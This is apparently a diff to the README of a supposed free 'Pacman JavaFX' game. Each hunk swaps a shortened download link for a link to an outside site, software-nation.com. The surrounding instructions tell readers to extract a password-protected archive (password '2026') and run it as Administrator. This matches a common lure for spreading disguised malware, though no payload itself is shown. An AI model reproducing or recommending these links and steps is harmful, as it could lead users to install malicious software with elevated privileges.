@@ -9,7 +9,7 @@ The **🟡 Pacman JavaFX** is a **free** classic arcade game recreation built wi
 
 <div align="center">
 
-[![Download Pacman JavaFX](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/pacman-javafx)
+[![Download Pacman JavaFX](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/pacman-javafx)
 
 </div>
 
@@ -96,7 +96,7 @@ Relive the golden age of arcade gaming with this faithful Pacman recreation. Bui
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Double-click `Pacman.jar` or run the launcher
 
-[![Download Pacman JavaFX](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/pacman-javafx)
+[![Download Pacman JavaFX](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/pacman-javafx)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -233,7 +233,7 @@ Play the classic arcade game for free. **Pacman JavaFX** delivers authentic Pacm
 
 <div align="center">
 
-[![Download Pacman JavaFX](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/pacman-javafx)
+[![Download Pacman JavaFX](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/pacman-javafx)
 
 **Version 4.6.1** — Classic arcade game. April 2026 update. Zero cost. No payment.
 
